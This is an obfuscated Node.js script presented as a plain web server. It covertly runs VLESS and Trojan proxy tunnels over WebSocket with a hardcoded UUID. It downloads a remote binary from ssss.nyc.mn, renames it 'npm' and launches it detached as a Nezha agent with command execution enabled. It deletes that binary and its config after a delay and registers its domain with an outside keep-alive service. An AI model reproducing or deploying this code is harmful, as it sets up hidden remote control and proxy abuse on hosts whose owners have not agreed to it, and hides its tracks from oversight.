const _0x3b8de6=_0x1277;(function(_0x452848,_0x42e590){const _0xd05912=_0x1277,_0x3906f9=_0x452848();while(!![]){try{const _0x16e91b=parseInt(_0xd05912(0xc8))/0x1*(parseInt(_0xd05912(0x10c))/0x2)+parseInt(_0xd05912(0x10d))/0x3*(parseInt(_0xd05912(0xcb))/0x4)+-parseInt(_0xd05912(0x97))/0x5+-parseInt(_0xd05912(0xab))/0x6*(-parseInt(_0xd05912(0xa2))/0x7)+-parseInt(_0xd05912(0x101))/0x8+-parseInt(_0xd05912(0x106))/0x9+-parseInt(_0xd05912(0xf6))/0xa*(-parseInt(_0xd05912(0xa1))/0xb);if(_0x16e91b===_0x42e590)break;else _0x3906f9['push'](_0x3906f9['shift']());}catch(_0x3db5e7){_0x3906f9['push'](_0x3906f9['shift']());}}}(_0x4013,0x59b95));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x3b8de6(0xdb)),net=require('net'),path=require('path'),crypto=require(_0x3b8de6(0xea)),{Buffer}=require(_0x3b8de6(0xdf)),{exec,execSync}=require(_0x3b8de6(0xae)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3b8de6(0xbc)]||'b448bf0a-d087-0018-63c5-39db92ff82d8',NEZHA_SERVER=process['env'][_0x3b8de6(0xf5)]||'',NEZHA_PORT=process[_0x3b8de6(0xde)][_0x3b8de6(0xd1)]||'',NEZHA_KEY=process[_0x3b8de6(0xde)][_0x3b8de6(0xcf)]||'',DOMAIN=process[_0x3b8de6(0xde)][_0x3b8de6(0xeb)]||_0x3b8de6(0xbb),AUTO_ACCESS=process[_0x3b8de6(0xde)][_0x3b8de6(0xa7)]||!![],WSPATH=process['env'][_0x3b8de6(0xc2)]||UUID[_0x3b8de6(0xe3)](0x0,0x8),SUB_PATH=process[_0x3b8de6(0xde)][_0x3b8de6(0xfc)]||_0x3b8de6(0xf3),NAME=process[_0x3b8de6(0xde)][_0x3b8de6(0xc6)]||'',PORT=process[_0x3b8de6(0xde)][_0x3b8de6(0xfd)]||0x1eb4;let ISP='';function _0x4013(){const _0x57d178=['/bin/bash','1234.abc.com','UUID','application/dns-json','from','listen','true',':443?encryption=none&security=tls&sni=','WSPATH','decode','data','setsid\x20nohup\x20./npm\x20-s\x20','NAME','readUInt16BE','37978PASLnc','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','createWriteStream','4ZmIWnJ','Hello\x20world!','map','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','NEZHA_KEY','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','8443','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','pop','then','config.yaml','trojan://','digest','npm\x20running\x20error:','443','axios','write','1.1.1.1','env','buffer','arm64','substr','stream','slice','&path=%2F','2083','close','Automatic\x20Access\x20Task\x20added\x20successfully','arch','utf-8','crypto','DOMAIN','error','toString','get','https://amd64.ssss.nyc.mn/v1','Not\x20Found\x0a','2096','text/plain','sub','arm','NEZHA_SERVER','779180TCcuvL','createServer','Failed\x20to\x20resolve\x20','sha224','readFile','join','SUB_PATH','PORT','utf8','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/v1','4600184JWVWJl','chmod\x20+x\x20npm','update','Answer','\x20with\x20all\x20DNS\x20servers','4713849zpqEMs','https://','finish','error:\x20','length','text/html','12jYLiFY','1745061vnzlzJ','log','npm\x20is\x20running','trim','end','connect','concat','npm\x20is\x20already\x20running,\x20skip\x20running...','type','3476155FYvYdm','message','test','reduce','writeFileSync','https://api.ip.sb/geoip','npm','catch','&fp=chrome&type=ws&host=','split','143RbNlWG','7rrpuNA','writeHead','includes','connection','Unknown','AUTO_ACCESS',':443?security=tls&sni=','isp','readUInt8','2034210CAoVbr','--tls','pipe','child_process','find','Server\x20is\x20running\x20on\x20port\x20','replace','8.8.4.4','index.html','country_code','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','url','aarch64','every','vless://'];_0x4013=function(){return _0x57d178;};return _0x4013();}const GetISP=async()=>{const _0x480fda=_0x3b8de6;try{const _0x430f82=await axios['get'](_0x480fda(0x9c)),_0x4b4b28=_0x430f82[_0x480fda(0xc4)];ISP=(_0x4b4b28[_0x480fda(0xb4)]+'-'+_0x4b4b28[_0x480fda(0xa9)])[_0x480fda(0xb1)](/ /g,'_');}catch(_0x2146b8){ISP=_0x480fda(0xa6);}};GetISP();const httpServer=http[_0x3b8de6(0xf7)]((_0x2cf3cd,_0x5ca569)=>{const _0x9d5292=_0x3b8de6;if(_0x2cf3cd[_0x9d5292(0xb6)]==='/'){const _0x58a787=path[_0x9d5292(0xfb)](__dirname,_0x9d5292(0xb3));fs[_0x9d5292(0xfa)](_0x58a787,_0x9d5292(0xfe),(_0xc86761,_0x40afcc)=>{const _0x1ee3bf=_0x9d5292;if(_0xc86761){_0x5ca569[_0x1ee3bf(0xa3)](0xc8,{'Content-Type':_0x1ee3bf(0x10b)}),_0x5ca569[_0x1ee3bf(0x92)](_0x1ee3bf(0xcc));return;}_0x5ca569[_0x1ee3bf(0xa3)](0xc8,{'Content-Type':_0x1ee3bf(0x10b)}),_0x5ca569[_0x1ee3bf(0x92)](_0x40afcc);});return;}else{if(_0x2cf3cd[_0x9d5292(0xb6)]==='/'+SUB_PATH){const _0x3cbe1e=NAME?NAME+'-'+ISP:ISP,_0x3efaef=_0x9d5292(0xb9)+UUID+'@'+DOMAIN+_0x9d5292(0xc1)+DOMAIN+_0x9d5292(0x9f)+DOMAIN+_0x9d5292(0xe4)+WSPATH+'#'+_0x3cbe1e,_0x470bbc=_0x9d5292(0xd7)+UUID+'@'+DOMAIN+_0x9d5292(0xa8)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x9d5292(0xe4)+WSPATH+'#'+_0x3cbe1e,_0x3213f1=_0x3efaef+'\x0a'+_0x470bbc,_0x30caa8=Buffer[_0x9d5292(0xbe)](_0x3213f1)[_0x9d5292(0xed)]('base64');_0x5ca569[_0x9d5292(0xa3)](0xc8,{'Content-Type':'text/plain'}),_0x5ca569[_0x9d5292(0x92)](_0x30caa8+'\x0a');}else _0x5ca569['writeHead'](0x194,{'Content-Type':_0x9d5292(0xf2)}),_0x5ca569[_0x9d5292(0x92)](_0x9d5292(0xf0));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x3b8de6(0xb1)](/-/g,''),DNS_SERVERS=[_0x3b8de6(0xb2),_0x3b8de6(0xdd)];function resolveHost(_0x444c8a){return new Promise((_0x3ae884,_0x1c47b9)=>{const _0x24f123=_0x1277;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x24f123(0x99)](_0x444c8a)){_0x3ae884(_0x444c8a);return;}let _0x45e4db=0x0;function _0x4d5829(){const _0x2a9e1b=_0x24f123;if(_0x45e4db>=DNS_SERVERS[_0x2a9e1b(0x10a)]){_0x1c47b9(new Error(_0x2a9e1b(0xf8)+_0x444c8a+_0x2a9e1b(0x105)));return;}const _0x330a56=DNS_SERVERS[_0x45e4db];_0x45e4db++;const _0x13f12b='https://dns.google/resolve?name='+encodeURIComponent(_0x444c8a)+'&type=A';axios[_0x2a9e1b(0xee)](_0x13f12b,{'timeout':0x1388,'headers':{'Accept':_0x2a9e1b(0xbd)}})[_0x2a9e1b(0xd5)](_0x32ba95=>{const _0x18f716=_0x2a9e1b,_0x56b4d0=_0x32ba95[_0x18f716(0xc4)];if(_0x56b4d0['Status']===0x0&&_0x56b4d0['Answer']&&_0x56b4d0[_0x18f716(0x104)][_0x18f716(0x10a)]>0x0){const _0x3adaef=_0x56b4d0['Answer'][_0x18f716(0xaf)](_0x465a50=>_0x465a50[_0x18f716(0x96)]===0x1);if(_0x3adaef){_0x3ae884(_0x3adaef[_0x18f716(0xc4)]);return;}}_0x4d5829();})['catch'](_0x5af18e=>{_0x4d5829();});}_0x4d5829();});}function handleVlessConnection(_0x1f1298,_0xc91cab){const _0x7cc10a=_0x3b8de6,[_0x3cae4e]=_0xc91cab,_0x436c24=_0xc91cab[_0x7cc10a(0xe3)](0x1,0x11);if(!_0x436c24[_0x7cc10a(0xb8)]((_0x1fb614,_0x4698e1)=>_0x1fb614==parseInt(uuid[_0x7cc10a(0xe1)](_0x4698e1*0x2,0x2),0x10)))return![];let _0x5d4b3c=_0xc91cab[_0x7cc10a(0xe3)](0x11,0x12)['readUInt8']()+0x13;const _0x5cfede=_0xc91cab[_0x7cc10a(0xe3)](_0x5d4b3c,_0x5d4b3c+=0x2)['readUInt16BE'](0x0),_0x23630=_0xc91cab['slice'](_0x5d4b3c,_0x5d4b3c+=0x1)[_0x7cc10a(0xaa)](),_0x15e478=_0x23630==0x1?_0xc91cab[_0x7cc10a(0xe3)](_0x5d4b3c,_0x5d4b3c+=0x4)[_0x7cc10a(0xfb)]('.'):_0x23630==0x2?new TextDecoder()[_0x7cc10a(0xc3)](_0xc91cab[_0x7cc10a(0xe3)](_0x5d4b3c+0x1,_0x5d4b3c+=0x1+_0xc91cab[_0x7cc10a(0xe3)](_0x5d4b3c,_0x5d4b3c+0x1)[_0x7cc10a(0xaa)]())):_0x23630==0x3?_0xc91cab['slice'](_0x5d4b3c,_0x5d4b3c+=0x10)['reduce']((_0x258748,_0x14bc8b,_0x4a74f4,_0x2ee662)=>_0x4a74f4%0x2?_0x258748['concat'](_0x2ee662[_0x7cc10a(0xe3)](_0x4a74f4-0x1,_0x4a74f4+0x1)):_0x258748,[])[_0x7cc10a(0xcd)](_0x24f25d=>_0x24f25d[_0x7cc10a(0xc7)](0x0)['toString'](0x10))['join'](':'):'';_0x1f1298['send'](new Uint8Array([_0x3cae4e,0x0]));const _0x4d1dc6=createWebSocketStream(_0x1f1298);return resolveHost(_0x15e478)['then'](_0x442f2b=>{net['connect']({'host':_0x442f2b,'port':_0x5cfede},function(){const _0x2f0bdb=_0x1277;this[_0x2f0bdb(0xdc)](_0xc91cab[_0x2f0bdb(0xe3)](_0x5d4b3c)),_0x4d1dc6['on'](_0x2f0bdb(0xec),()=>{})[_0x2f0bdb(0xad)](this)['on'](_0x2f0bdb(0xec),()=>{})[_0x2f0bdb(0xad)](_0x4d1dc6);})['on']('error',()=>{});})[_0x7cc10a(0x9e)](_0x16fbdd=>{const _0x20cc7b=_0x7cc10a;net['connect']({'host':_0x15e478,'port':_0x5cfede},function(){const _0x55df6f=_0x1277;this['write'](_0xc91cab['slice'](_0x5d4b3c)),_0x4d1dc6['on']('error',()=>{})[_0x55df6f(0xad)](this)['on']('error',()=>{})[_0x55df6f(0xad)](_0x4d1dc6);})['on'](_0x20cc7b(0xec),()=>{});}),!![];}function _0x1277(_0x3970db,_0x2aa7c6){_0x3970db=_0x3970db-0x90;const _0x40136b=_0x4013();let _0x127732=_0x40136b[_0x3970db];return _0x127732;}function handleTrojanConnection(_0x535c81,_0x20b45a){const _0x51f0c8=_0x3b8de6;try{if(_0x20b45a['length']<0x3a)return![];const _0x28f3fd=_0x20b45a[_0x51f0c8(0xe3)](0x0,0x38)['toString'](),_0x53907b=[UUID];let _0x2be94e=null;for(const _0x11c9af of _0x53907b){const _0x4bf3cf=crypto['createHash'](_0x51f0c8(0xf9))[_0x51f0c8(0x103)](_0x11c9af)[_0x51f0c8(0xd8)]('hex');if(_0x4bf3cf===_0x28f3fd){_0x2be94e=_0x11c9af;break;}}if(!_0x2be94e)return![];let _0x3bfd53=0x38;_0x20b45a[_0x3bfd53]===0xd&&_0x20b45a[_0x3bfd53+0x1]===0xa&&(_0x3bfd53+=0x2);const _0xd99a53=_0x20b45a[_0x3bfd53];if(_0xd99a53!==0x1)return![];_0x3bfd53+=0x1;const _0x180a27=_0x20b45a[_0x3bfd53];_0x3bfd53+=0x1;let _0x1ace54,_0x5d5fe5;if(_0x180a27===0x1)_0x1ace54=_0x20b45a[_0x51f0c8(0xe3)](_0x3bfd53,_0x3bfd53+0x4)['join']('.'),_0x3bfd53+=0x4;else{if(_0x180a27===0x3){const _0x5a0288=_0x20b45a[_0x3bfd53];_0x3bfd53+=0x1,_0x1ace54=_0x20b45a['slice'](_0x3bfd53,_0x3bfd53+_0x5a0288)[_0x51f0c8(0xed)](),_0x3bfd53+=_0x5a0288;}else{if(_0x180a27===0x4)_0x1ace54=_0x20b45a['slice'](_0x3bfd53,_0x3bfd53+0x10)[_0x51f0c8(0x9a)]((_0x39fb76,_0x55d535,_0x1fc836,_0x22df40)=>_0x1fc836%0x2?_0x39fb76[_0x51f0c8(0x94)](_0x22df40['slice'](_0x1fc836-0x1,_0x1fc836+0x1)):_0x39fb76,[])[_0x51f0c8(0xcd)](_0x54b72d=>_0x54b72d[_0x51f0c8(0xc7)](0x0)[_0x51f0c8(0xed)](0x10))[_0x51f0c8(0xfb)](':'),_0x3bfd53+=0x10;else return![];}}_0x5d5fe5=_0x20b45a[_0x51f0c8(0xc7)](_0x3bfd53),_0x3bfd53+=0x2;_0x3bfd53<_0x20b45a[_0x51f0c8(0x10a)]&&_0x20b45a[_0x3bfd53]===0xd&&_0x20b45a[_0x3bfd53+0x1]===0xa&&(_0x3bfd53+=0x2);const _0x3078fb=createWebSocketStream(_0x535c81);return resolveHost(_0x1ace54)[_0x51f0c8(0xd5)](_0x48fe2b=>{const _0xf5ec1d=_0x51f0c8;net[_0xf5ec1d(0x93)]({'host':_0x48fe2b,'port':_0x5d5fe5},function(){const _0x54ce05=_0xf5ec1d;_0x3bfd53<_0x20b45a['length']&&this['write'](_0x20b45a[_0x54ce05(0xe3)](_0x3bfd53)),_0x3078fb['on'](_0x54ce05(0xec),()=>{})[_0x54ce05(0xad)](this)['on'](_0x54ce05(0xec),()=>{})['pipe'](_0x3078fb);})['on']('error',()=>{});})[_0x51f0c8(0x9e)](_0x43a0c3=>{const _0x3da46c=_0x51f0c8;net[_0x3da46c(0x93)]({'host':_0x1ace54,'port':_0x5d5fe5},function(){const _0x26a769=_0x3da46c;_0x3bfd53<_0x20b45a[_0x26a769(0x10a)]&&this['write'](_0x20b45a[_0x26a769(0xe3)](_0x3bfd53)),_0x3078fb['on']('error',()=>{})[_0x26a769(0xad)](this)['on'](_0x26a769(0xec),()=>{})[_0x26a769(0xad)](_0x3078fb);})['on'](_0x3da46c(0xec),()=>{});}),!![];}catch(_0x1b9d37){return![];}}wss['on'](_0x3b8de6(0xa5),(_0x2249c3,_0x114cea)=>{const _0x5857a4=_0x3b8de6,_0x518339=_0x114cea[_0x5857a4(0xb6)]||'';_0x2249c3['once'](_0x5857a4(0x98),_0xaccd4c=>{const _0x306b6f=_0x5857a4;if(_0xaccd4c[_0x306b6f(0x10a)]>0x11&&_0xaccd4c[0x0]===0x0){const _0x4c6feb=_0xaccd4c[_0x306b6f(0xe3)](0x1,0x11),_0x28d08c=_0x4c6feb[_0x306b6f(0xb8)]((_0x1f94cd,_0x2193b2)=>_0x1f94cd==parseInt(uuid['substr'](_0x2193b2*0x2,0x2),0x10));if(_0x28d08c){!handleVlessConnection(_0x2249c3,_0xaccd4c)&&_0x2249c3[_0x306b6f(0xe6)]();return;}}!handleTrojanConnection(_0x2249c3,_0xaccd4c)&&_0x2249c3['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3ad591=_0x3b8de6,_0xa8ca49=os[_0x3ad591(0xe8)]();return _0xa8ca49===_0x3ad591(0xf4)||_0xa8ca49===_0x3ad591(0xe0)||_0xa8ca49===_0x3ad591(0xb7)?!NEZHA_PORT?_0x3ad591(0x100):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x3ad591(0xef):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x315625=_0x3b8de6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1a156d=getDownloadUrl(),_0x2e579d=await axios({'method':'get','url':_0x1a156d,'responseType':_0x315625(0xe2)}),_0xbdfe46=fs[_0x315625(0xca)](_0x315625(0x9d));return _0x2e579d[_0x315625(0xc4)][_0x315625(0xad)](_0xbdfe46),new Promise((_0x178e8a,_0x390284)=>{const _0x1864e6=_0x315625;_0xbdfe46['on'](_0x1864e6(0x108),()=>{const _0x55220a=_0x1864e6;console[_0x55220a(0x10e)]('npm\x20download\x20successfully'),exec(_0x55220a(0x102),_0x3a1ca7=>{if(_0x3a1ca7)_0x390284(_0x3a1ca7);_0x178e8a();});}),_0xbdfe46['on'](_0x1864e6(0xec),_0x390284);});}catch(_0x4c1ec7){throw _0x4c1ec7;}},runnz=async()=>{const _0x37210f=_0x3b8de6;try{const _0x57a576=execSync(_0x37210f(0xb5),{'encoding':_0x37210f(0xe9)});if(_0x57a576[_0x37210f(0x91)]()!==''){console[_0x37210f(0x10e)](_0x37210f(0x95));return;}}catch(_0x53a1e3){}await downloadFile();let _0x1bb5b8='',_0x116671=[_0x37210f(0xda),_0x37210f(0xd2),_0x37210f(0xf1),'2087',_0x37210f(0xe5),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4c36e2=_0x116671[_0x37210f(0xa4)](NEZHA_PORT)?_0x37210f(0xac):'';_0x1bb5b8=_0x37210f(0xc5)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4c36e2+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x137b52=NEZHA_SERVER[_0x37210f(0xa4)](':')?NEZHA_SERVER[_0x37210f(0xa0)](':')[_0x37210f(0xd4)]():'',_0x1bf1ac=_0x116671[_0x37210f(0xa4)](_0x137b52)?_0x37210f(0xc0):'false',_0x37ce92='client_secret:\x20'+NEZHA_KEY+_0x37210f(0xc9)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1bf1ac+_0x37210f(0xd3)+UUID;fs[_0x37210f(0x9b)]('config.yaml',_0x37ce92);}_0x1bb5b8=_0x37210f(0xd0);}else{console[_0x37210f(0x10e)](_0x37210f(0xce));return;}}try{exec(_0x1bb5b8,{'shell':_0x37210f(0xba)},_0x14b87a=>{const _0x598261=_0x37210f;if(_0x14b87a)console['error'](_0x598261(0xd9),_0x14b87a);else console[_0x598261(0x10e)](_0x598261(0x90));});}catch(_0x2cb075){console[_0x37210f(0xec)](_0x37210f(0x109)+_0x2cb075);}};async function addAccessTask(){const _0x1027cd=_0x3b8de6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5df03d=_0x1027cd(0x107)+DOMAIN;try{const _0x24fa5e=await axios['post'](_0x1027cd(0xff),{'url':_0x5df03d},{'headers':{'Content-Type':'application/json'}});console[_0x1027cd(0x10e)](_0x1027cd(0xe7));}catch(_0xff8a69){}}const delFiles=()=>{const _0x20d8ba=_0x3b8de6;fs['unlink']('npm',()=>{}),fs['unlink'](_0x20d8ba(0xd6),()=>{});};httpServer[_0x3b8de6(0xbf)](PORT,()=>{const _0x46888=_0x3b8de6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x46888(0x10e)](_0x46888(0xb0)+PORT);});
